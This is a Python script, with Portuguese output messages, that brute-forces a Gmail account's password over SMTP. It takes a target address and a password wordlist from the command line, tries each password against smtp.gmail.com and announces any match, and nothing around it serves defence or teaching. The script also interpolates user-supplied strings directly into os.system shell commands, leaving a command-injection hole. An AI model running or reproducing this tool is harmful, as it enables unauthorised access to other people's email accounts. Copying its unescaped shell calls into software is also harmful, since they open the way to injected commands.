import smtplib,os,sys
# -*- coding: UTF-8 -*-
def SMTPbrute(usr,passw):
    try:
        print("")
        print("")
        os.system('echo "Google patcheou agora so funciona em  contas  que premitem conexao de apps menos seguros" |lolcat ')
        os.system('echo "_____________________________" |lolcat')
        smtpserver = smtplib.SMTP("smtp.gmail.com",587)
        smtpserver.ehlo()
        smtpserver.starttls()
        user = usr
        if '.txt' not in passw:
            passw += ".txt"
        else:
            passw = passw
        os.system('echo "{}" |lolcat  '.format(user))
        os.system('echo "_____________________________" |lolcat ')
        passw = open(passw,"r")
        for senhas in passw.readlines():
            try:
                try:
                    try:
                        if smtpserver.login(usr, senhas):
                            os.system('echo "[+] Senha achada:{}  ^-^" | lolcat'.format(senhas))    
                            os.system('echo "_____________________________" |lolcat ')        
                            break
                    except smtplib.SMTPAuthenticationError as e:
                        os.system("echo '[-] Senha errada: {}' |lolcat  ".format(senhas))
                except smtplib.SMTPServerDisconnected:
                    os.system("echo '[-] Conexao fechada pelo host ' |lolcat  ")
                    break

            except KeyboardInterrupt:
                print("")
                os.system('echo "_____________________________" |lolcat ') 
                break           
    except FileNotFoundError:
        os.system('echo "[-] arquivo nao achado " |lolcat ')

    
            

            
            
            
os.system("toilet 'The_end' |lolcat")                
try:
    SMTPbrute(sys.argv[1],sys.argv[2])            
except IndexError:
    os.system("echo 'usagem main.py endereco de email wordlist' |lolcat") 
